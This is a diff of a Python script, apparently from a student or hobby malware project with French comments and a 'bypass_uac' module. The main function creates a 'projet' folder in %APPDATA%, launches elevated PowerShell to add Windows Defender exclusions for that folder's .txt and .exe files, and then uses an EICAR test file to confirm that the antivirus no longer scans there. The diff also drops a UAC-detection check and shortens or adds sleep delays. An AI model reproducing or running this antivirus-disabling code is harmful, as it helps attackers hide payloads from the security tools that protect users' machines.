@@ -21,7 +21,7 @@ def eicar_test():
 
 def wait_and_detect_eicar():
     #if ecair.txt exist return true
-    time.sleep(5)
+    time.sleep(2)
     try :
         with open(completeName) as f:
             f.read()
@@ -33,19 +33,18 @@ def wait_and_detect_eicar():
 
 
 def main():
-    if bypass_uac.detect_uac():
-        global save_path
-        path = os.environ["appdata"]
-        directory = "projet"
-        save_path = os.path.join(path, directory)
-        print(save_path)
-        os.mkdir(save_path)
-        os.popen(f""" powershell -Command Start-Process powershell -Verb runas 'Add-MpPreference -ExclusionPath "{save_path}\\*.txt","{save_path}\\*.exe"' """)
-        if eicar_test():
-            print("Super ca marche")
-            return True
-        else:
-            return False
+    global save_path
+    path = os.environ["appdata"]
+    directory = "projet"
+    save_path = os.path.join(path, directory)
+    print(save_path)
+    os.mkdir(save_path)
+    os.popen(f""" powershell -Command Start-Process powershell -Verb runas 'Add-MpPreference -ExclusionPath "{save_path}\\*.txt","{save_path}\\*.exe"' """)
+    time.sleep(10)
+    if eicar_test():
+        print("Super ca marche")
+        return True
     else:
-        print("Erreur")
         return False
+
+#main()
